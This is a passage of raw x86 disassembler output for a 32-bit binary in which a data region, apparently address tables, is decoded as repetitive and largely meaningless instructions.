  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    ah,dl
  412425:	cmp    al,BYTE PTR [ebx]
  412427:	add    ah,dl
  412429:	sub    al,BYTE PTR [ebx]
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
